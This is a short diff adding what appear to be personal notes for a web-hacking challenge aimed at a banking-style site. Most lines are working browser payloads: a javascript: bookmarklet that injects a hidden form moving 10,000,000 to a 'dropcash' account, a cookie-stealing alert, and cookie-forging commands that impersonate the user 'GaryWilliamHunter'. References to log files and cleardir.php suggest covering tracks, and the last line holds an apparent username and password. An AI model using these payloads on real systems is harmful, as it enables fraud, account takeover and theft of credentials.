@@ -1,0 +1,20 @@
+Garry Hunter
+Drop cash
+log files
+movemoney.php
+cleardir.php
+
+javascript:void(document.write(' <form name=the_form
+action=movemoney.php
+method=post><input type=hidden name=TO
+value=dropcash><input type=hidden name=AMOUNT value=10000000>
+<input tpype=submit value="Move Money To A Different Account"></form>'))
+
+GaryWilliamHunter : -- $$$$$ --
+accountPassword -- $$$$$ --
+accountUsername=GaryWilliamHunter
+javascript:alert(document.cookie);
+
+javascript:void(document.cookie="accountUsername=GaryWilliamHunter")
+javascript:void(document.cookie="accountPassword=-- $$$$$ --")
+'Zach Sanche liberty638  liberty638
